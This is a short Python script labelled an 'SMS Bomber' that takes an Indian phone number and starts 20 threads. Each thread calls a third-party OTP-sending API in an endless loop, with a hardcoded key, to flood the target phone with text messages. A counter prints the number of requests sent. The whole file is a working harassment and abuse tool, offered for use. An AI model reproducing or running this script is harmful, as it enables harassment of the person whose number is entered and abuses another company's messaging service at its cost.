import requests
from threading import Thread
import time

print("SMS Bomber made by pyshivam.")
print("This script only work in Linux Environment.\n\n")
no = input("Enter number ( without +91 ): ")
n = 0


def bomber():
    global n
    while True:
        requests.get(
            "http://scandid.in/api/sendOTP?utm_medium=default&pid=mobile&connection_type=4G&dpi=640&key=99g3ohok860ep&did=all&uuid=Super-nova&s_id=nova&suserid=scusr-super-nova&mobnum=" + no + "&vc=93")
        n += 1


for i in range(20):
    Thread(target=bomber).start()


def count():
    global n
    while True:
        print(n)
        time.sleep(5)


t = Thread(target=count)
t.start()
t.join()
